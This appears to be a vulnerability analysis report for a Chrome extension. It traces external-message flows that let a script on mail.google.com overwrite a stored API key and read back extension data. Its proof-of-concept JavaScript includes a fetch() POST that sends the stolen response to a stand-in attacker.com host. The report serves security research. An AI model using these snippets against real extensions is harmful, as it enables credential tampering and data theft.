# CoCo Analysis: elpiekaehikfeikdafacpofkjenfipke

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3 (1 TP storage write, 1 TP storage read, 1 FP hardcoded backend)

---

## Sink 1: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/elpiekaehikfeikdafacpofkjenfipke/opgen_generated_files/bg.js
Line 989: apiKey = request.data;
Line 990: chrome.storage.local.set({ apiKey })
Flow: chrome.runtime.onMessageExternal → request.data → storage.local.set
```

**Code:**
```javascript
// Background script (bg.js line 967-993)

// Entry point - external message listener
chrome.runtime.onMessageExternal.addListener(function(request, sender, sendResponse) {
    chrome.storage.local.get(["apiKey"], function(localData) {
        var apiKey = localData.apiKey;
        var action = request.action; // ← attacker-controlled

        switch (action) {
            case "addContact":
                url = "https://www.thewiseagent.com/extension/EndPoint/EndPoint/?action=addClient";
                break;
            // ... other cases ...
            case "addAPIKey":
                apiKey = request.data; // ← attacker-controlled data
                chrome.storage.local.set({ apiKey }, function() {
                    sendResponse({ apiKey }); // Send confirmation back
                });
                return;
            case "getExtensionId":
                chrome.storage.local.get(["extensionId"], function(localData2) {
                    sendResponse({ extensionId: localData2.extensionId });
                });
                return;
        }
    });
    return true;
});
```

**Classification:** TRUE POSITIVE (part of complete storage exploitation chain with Sink 2)

**Attack Vector:** chrome.runtime.sendMessageExternal (external message from mail.google.com)

**Attack:**
```javascript
// From https://mail.google.com/* (attacker controls webpage via XSS or malicious script)

// Write arbitrary API key to storage
chrome.runtime.sendMessage(
    "elpiekaehikfeikdafacpofkjenfipke", // Extension ID
    {
        action: "addAPIKey",
        data: "attacker_controlled_api_key_12345" // ← Malicious API key
    },
    function(response) {
        console.log("Stored malicious API key:", response.apiKey);
    }
);
```

**Impact:** Attacker from mail.google.com can write arbitrary API keys to chrome.storage.local, potentially overwriting legitimate user credentials. Combined with Sink 2, this forms a complete storage exploitation chain.

---

## Sink 2: storage_local_get_source → sendResponseExternal_sink (Information Disclosure)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/elpiekaehikfeikdafacpofkjenfipke/opgen_generated_files/bg.js
Line 995-997: chrome.storage.local.get → sendResponse
Flow: chrome.runtime.onMessageExternal → storage.local.get → sendResponse (to external caller)
```

**Code:**
```javascript
// Background script (bg.js line 967-998)

chrome.runtime.onMessageExternal.addListener(function(request, sender, sendResponse) {
    chrome.storage.local.get(["apiKey"], function(localData) {
        var action = request.action; // ← attacker-controlled

        switch (action) {
            // ... other cases ...
            case "getExtensionId":
                // Read storage and send back to attacker
                chrome.storage.local.get(["extensionId"], function(localData2) {
                    sendResponse({ extensionId: localData2.extensionId }); // ← Storage data sent to external caller
                });
                return;
        }
    });
    return true;
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.sendMessageExternal with complete storage exploitation chain

**Attack:**
```javascript
// From https://mail.google.com/* (attacker controls webpage)

// Complete storage exploitation attack
// Step 1: Write malicious data
chrome.runtime.sendMessage(
    "elpiekaehikfeikdafacpofkjenfipke",
    {
        action: "addAPIKey",
        data: "stolen_credentials_or_tracker_id"
    },
    function(response) {
        console.log("Poisoned storage with:", response.apiKey);
    }
);

// Step 2: Read sensitive extension data
chrome.runtime.sendMessage(
    "elpiekaehikfeikdafacpofkjenfipke",
    {
        action: "getExtensionId"
    },
    function(response) {
        console.log("Stolen extensionId:", response.extensionId);

        // Exfiltrate to attacker server
        fetch("https://attacker.com/exfil", {
            method: "POST",
            body: JSON.stringify(response)
        });
    }
);
```

**Impact:** Complete storage exploitation chain - attacker from mail.google.com can both write arbitrary data to storage (API keys) and read sensitive data (extension IDs) via external messages. Per the methodology, even though only mail.google.com can exploit it (via XSS or malicious scripts), this is TRUE POSITIVE because "If even ONE webpage/extension can trigger it, classify as TRUE POSITIVE." The attacker achieves information disclosure of extension data and can manipulate stored credentials.

---

## Sink 3: fetch_source → sendResponseExternal_sink (referenced only CoCo framework code)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/elpiekaehikfeikdafacpofkjenfipke/opgen_generated_files/bg.js
Line 265: var responseText = 'data_from_fetch'; (CoCo framework mock)
Line 1011-1017: Actual fetch in extension code
```

**Code:**
```javascript
// Background script (bg.js line 1006-1018)

function sendMsg(request, apiKey, sendResponse, url) {
    // url is hardcoded in switch statement above, e.g.:
    // "https://www.thewiseagent.com/extension/EndPoint/EndPoint/?action=addClient"

    if (apiKey == null || apiKey == "") {
        sendResponse({ error: "No API Key" });
        return;
    }

    fetch(url, { // ← url is hardcoded developer backend
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body: request.data + "&apiKey=" + apiKey
    })
    .then((response) => response.json())
    .then((data) => sendResponse(data)) // ← Data from hardcoded backend sent to external caller
    .catch((error) => sendResponse({ error: "No API Key" }));
}
```

**Classification:** FALSE POSITIVE

**Reason:** The fetch URLs are all hardcoded to the developer's backend (`https://www.thewiseagent.com/extension/EndPoint/EndPoint/`). The data flows from the developer's trusted infrastructure to the external caller. Per the methodology: "Data FROM hardcoded backend: fetch('https://api.myextension.com') → response → sendResponse is FALSE POSITIVE - developer trusts their own infrastructure; compromising it is infrastructure issue, not extension vulnerability." While the external message can trigger the fetch, the URL is not attacker-controlled and comes from the developer's own backend.
